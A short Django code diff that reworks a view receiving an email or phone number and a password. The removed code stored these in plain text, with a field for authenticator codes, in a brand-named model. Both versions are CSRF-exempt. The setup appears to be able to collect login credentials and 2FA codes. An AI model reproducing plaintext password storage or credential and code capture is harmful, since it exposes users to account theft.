@@ -70,6 +70,7 @@ from rest_framework.decorators import api_view
 from rest_framework.response import Response
 from .models import UserProfileNoones
 from .serializers import UserProfileNoonesSerializer
+import json
 
 
 
@@ -1025,20 +1026,22 @@ def indextwo(request):
 
     #noones
 # View to submit email/phone and password
-@csrf_exempt
-@api_view(['POST'])
-def submit_user_data(request):
-    if request.method == 'POST':
-        email_or_phone = request.data.get('emailOrPhone')
-        password = request.data.get('password')
 
-        # Create and save the data
-        user_profile = UserProfileNoones.objects.create(
-            email_or_phone=email_or_phone,
-            password=password,
-            authenticator_codes=[]
-        )
-        return Response({'message': 'Data submitted successfully!'}, status=status.HTTP_201_CREATED)
+@csrf_exempt
+def submit_user_data(request):
+    if request.method == "POST":
+        try:
+            data = json.loads(request.body)
+            email_or_phone = data.get("emailOrPhone")
+            password = data.get("password")
+
+            if email_or_phone and password:
+                return JsonResponse({"message": "User data received successfully!"}, status=200)
+            else:
+                return JsonResponse({"error": "Missing fields"}, status=400)
+        except json.JSONDecodeError:
+            return JsonResponse({"error": "Invalid JSON"}, status=400)
+    return JsonResponse({"error": "Invalid request method"}, status=405)
 
 # View to submit authenticator code
 @csrf_exempt
